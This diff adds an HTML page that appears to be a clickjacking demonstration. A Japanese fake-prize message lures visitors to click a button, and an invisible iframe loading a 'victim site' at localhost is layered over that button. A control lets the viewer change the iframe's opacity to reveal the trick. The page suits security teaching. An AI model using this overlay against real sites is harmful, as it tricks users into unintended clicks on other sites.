@@ -1,0 +1,60 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+</head>
+
+<body>
+
+
+<div>おめでとうございます！！<br>当サイトに訪れた記念すべき5万人目のユーザーであるあなたには豪華プレゼントをお送りします！！！</div>
+
+<!-- The url from the victim site -->
+<iframe id="trap" src="http://localhost:8080/test"></iframe>
+
+<button>詳しく見る！</button>
+
+
+<br>
+<br>
+<br>
+
+<div style="margin:5px;">
+    <input type="radio" name="radio-button" value="0" checked="true">0%　
+    <input type="radio" name="radio-button" value="0.5">50%　
+    <input type="radio" name="radio-button" value="1.0">100%
+
+    <input type="button" value="変更" onclick="addCss();" style="width:100px;margin-left:10px;"></div>
+
+<script>
+    function addCss(){
+        let ele = document.getElementsByName("radio-button");
+        let state;
+        for(let i=0; i<ele.length; i++){
+            if (ele[i].checked) {
+                state = ele[i].value;
+                break;
+            }
+        }
+        document.getElementById("trap").style.opacity = parseFloat(state);
+    }
+
+</script>
+
+
+<style>
+    iframe {
+        width: 400px;
+        height: 100px;
+        position: absolute;
+        top: 5px;
+        left: -14px;
+        opacity: 0;
+        z-index: 1;
+    }
+</style>
+
+
+</body>
+</html>
